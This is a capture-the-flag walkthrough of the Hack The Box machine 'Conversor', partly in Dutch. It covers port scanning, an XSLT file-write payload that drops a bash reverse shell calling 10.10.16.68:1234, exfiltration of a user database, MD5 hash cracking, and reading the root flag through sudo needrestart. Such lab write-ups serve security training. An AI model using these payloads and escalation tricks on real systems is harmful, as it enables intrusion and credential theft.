# Initial Enumeration
## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ nmap -p- 10.129.92.162               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:49 CET
Nmap scan report for 10.129.92.162
Host is up (0.024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ nmap -p22,80 -sCV 10.129.92.162 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-28 00:50 CET
Nmap scan report for 10.129.92.162
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 01:74:26:39:47:bc:6a:e2:cb:12:8b:71:84:9c:f8:5a (ECDSA)
|_  256 3a:16:90:dc:74:d8:e3:c4:51:36:e2:08:06:26:17:ee (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://conversor.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Als eerst zal ik naar de webpagina gaan voor het bekijken wat we daar kunnen vinden. zoals kunt zien kom je op een login pagina. Je zal als eerst een gebruiker moeten aanmaken vooraleer je zult kunnen inloggen. Eens dat je de gebruiker aan hebt gemaakt kan je inloggen en kom je op de volgende pagina.

![[Pasted image 20251027193639.png]]

Hier kan je zien dat je bestanden kunt uploaden. Als je naar de about gaat kijken kan je zien dat je de source code kunt downloaden.

![[Pasted image 20251027193932.png]]

We zullen de files die in de .gz file zitten gaan uitpakken. Dit kan je gaan doen door het volgende commando te gebruiken.

```
──(kali㉿kali)-[~/HTB/Conversor]
└─$ tar -xvf source_code.tar.gz
app.py
app.wsgi
install.md
instance/
instance/users.db
scripts/
static/
static/images/
static/images/david.png
static/images/fismathack.png
static/images/arturo.png
static/nmap.xslt
static/style.css
templates/
templates/register.html
templates/about.html
templates/index.html
templates/login.html
templates/base.html
templates/result.html
uploads/
```
Kben gaan kijken in de database file maar ik heb er niets in gevonden. Dus ben ik een revshell gaan aanmaken.
aanmaken van een revshell.

```
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ cat test.xslt 
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">
  <ptswarm:document href="/var/www/conversor.htb/scripts/test2.py" method="text">
import os

os.system(
    "bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.68/1234 0&gt;&amp;1'")
  </ptswarm:document>
</xsl:template>
</xsl:stylesheet>
```

We zullen voor het uploaden van de revshell ook een standaard .xml file moeten aanmaken maar dit maakt niet uit wat er in de xml file staat. Nu kan je de file gaan uploaden en kan je hieronder zien dat we een connectie hebben gekregen met de server.

![[Pasted image 20251027232212.png]]

We gaan de file van de server halen zodat we kunnen kijken welke users en zijn hashes in de database zitten.

```
www-data@conversor:~/conversor.htb/instance$ python3 -m http.server 8000
python3 -m http.server 8000
10.10.16.68 - - [27/Oct/2025 22:24:51] "GET /users.db HTTP/1.1" 200 -

┌──(kali㉿kali)-[~/HTB/Conversor/test]
└─$ wget http://10.129.106.3:8000/users.db                                    
--2025-10-28 04:19:00--  http://10.129.106.3:8000/users.db
Connecting to 10.129.106.3:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 24576 (24K) [application/octet-stream]
Saving to: ‘users.db’

users.db                     100%[==============================================>]  24.00K  --.-KB/s    in 0.05s   

2025-10-28 04:19:01 (504 KB/s) - ‘users.db’ saved [24576/24576]

Bekijken van de hashes

┌──(kali㉿kali)-[~/HTB/Conversor/test]
└─$ sqlite3 users.db   
SQLite version 3.44.4 2025-02-19 00:18:53
Enter ".help" for usage hints.
sqlite> .tables
files  users
sqlite> SELECT * from users
   ...> ;
1|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec
5|test|098f6bcd4621d373cade4e832627b4f6

```

Cracking password

```
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
123              (?)     
Keepmesafeandwarm (?)     
2g 0:00:00:00 DONE (2025-10-28 01:43) 5.405g/s 29656Kp/s 29656Kc/s 29667KC/s Keiser01..Keepers137
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```


### SSH Connection

```
┌──(kali㉿kali)-[~/HTB/Conversor]
└─$ ssh fismathack@conversor.htb

fismathack@conversor:~$
```

User flag

```
fismathack@conversor:~$ cat user.txt
086dcf4f01ed827ee1a03b602bd107c8
```

Als je het sudo -l commando gaat doen kan je zien dat we /usr/sbin/needrestart kunnen gebruiken voor commando als root uittevoeren. Als je dan het help commando gaat gebruiken kan je zien dat als je het `-c` parameter gaat gebruiken kan je een config file gaan restarten waardoor dat als je de root.txt file kiest zal je de root flag te zien krijgen.

Zoals je hieronder zult kunnen zien heb ik de root flag gevonden.
```
fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt
Bareword found where operator expected at (eval 14) line 1, near "671d776b9da817cacdd5261e2733f38d"
        (Missing operator before d776b9da817cacdd5261e2733f38d?)
Error parsing /root/root.txt: syntax error at (eval 14) line 2, near "671d776b9da817cacdd5261e2733f38d
```

![[Pasted image 20251027204241.png]]